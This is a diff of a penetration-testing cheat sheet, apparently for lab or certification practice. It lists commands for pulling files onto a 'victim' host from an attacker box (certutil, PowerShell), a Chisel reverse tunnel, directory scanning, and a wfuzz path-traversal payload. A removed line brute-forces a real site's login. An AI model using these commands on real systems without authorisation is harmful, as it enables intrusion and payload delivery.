@@ -65,15 +65,15 @@ Using MSF. Start MSF before starting these steps:
 	
 #Powershell
 
-	1. Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py
+```Invoke-WebRequest -Uri http://127.0.0.1/exploit.py -OutFile C:\Users\Victim\exploit.py```
 	
 	Without an interactive powershell session:
-	
-	1. Create wget.ps1
+	```
+	   Create wget.ps1
 	   $client = New-Object System.Net.WebClient
 	   $path = "C:\path\to\save\file.txt"
 	   $client.DownloadFile($url, $path)
-	
+	```
 #Base64
 
 	local system:
@@ -83,13 +83,7 @@ Using MSF. Start MSF before starting these steps:
 	2. echo "base64string==" | base64 -d >> exploit.py
 	
 #Certutil
-		
-	local system (either python2/3):
-	1. python -m SimpleHTTPServer 80
-	1b. python3 -m http.server 80
-	
-	victim:
-	2. certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip
+	```certutil.exe -urlcache -split -f "http://ip.for.kali.box/file-to-get.zip" name-to-save-as.zip```
 
 Kerberoasting
 ----------------
@@ -177,7 +171,15 @@ Post Exploitation
 Port Forwarding
 ----------------
 #Chisel
-- 
+local system:
+```
+./chisel server -p 8080 --reverse
+```
+
+victim:
+```
+./chisel client YOUR_IP:8080 R:1234:127.0.0.1:1234
+```
 
 #Plink
 -
@@ -367,7 +369,7 @@ ICMP Injection
 
 VMware (not going full screen)
 ----------------
-- systemctl restart open-vm-tools.service
+```systemctl restart open-vm-tools.service```
 
 Web Servers:
 ----------------
@@ -380,42 +382,36 @@ Web Scanning:
 ----------------
 #Web Scanning with extensions
 
-```
-
 Linux (Example web server might be Apache)
-gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401
+```gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,jsp,pl -s 200,204,301,302,307,403,401```
 
 Windows (Example web server might be IIS)
 
-gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401
+```gobuster dir -e -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,js,txt,asp,aspx,jsp,bak -s 200,204,301,302,307,403,401```
 
 Linux (Example web server might be Apache) 
 
-python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50
+```python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,jsp,pl -t 50```
 
 Windows (Example web server might be IIS)
 
-python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50
-
-```
+```python3 dirsearch.py -r -u http://10.10.10.131/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,html,js,txt,asp,aspx,jsp,bak -t 50```
 
 #HTTP
-- gobuster dir -u http://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69
-- gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69
+```gobuster dir -u http://10.10.10.10 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt -t 69```
 
 #HTTPS
-- gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69
+```gobuster dir -k -u https://10.10.10.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 69```
 (in some cases --wildcard will need to be used instead of -k)
 
 #Nikto
-- nikto -h 10.10.10.10 -p 80
+```nikto -h 10.10.10.10 -p 80```
 
 #Nikto HTTPS
-- nikto -h 10.10.10.10. -p 443
+``nikto -h 10.10.10.10 -p 443```
 
 WFuzz
-- wfuzz -u http://google.com/login.php?username=admin&password=FUZZ -w /usr/share/wordlists/rockyou.txt
-- wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt
+```wfuzz -u http://10.10.10.10/hello.php?dir=../../../../../../../../../FUZZ%00 -w /usr/share/wfuzz/wordlist/general/common.txt```
 
 Web Shells
 ----------------
@@ -478,7 +474,7 @@ Writeable Directories
 - C:\windows\system32\microsoft\crypto\rsa\machinekeys
 
 # Linux
-- To find World Writeable Directories in Linux use the command:
+To find World Writeable Directories in Linux use the command:
 ```find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print```
 
 
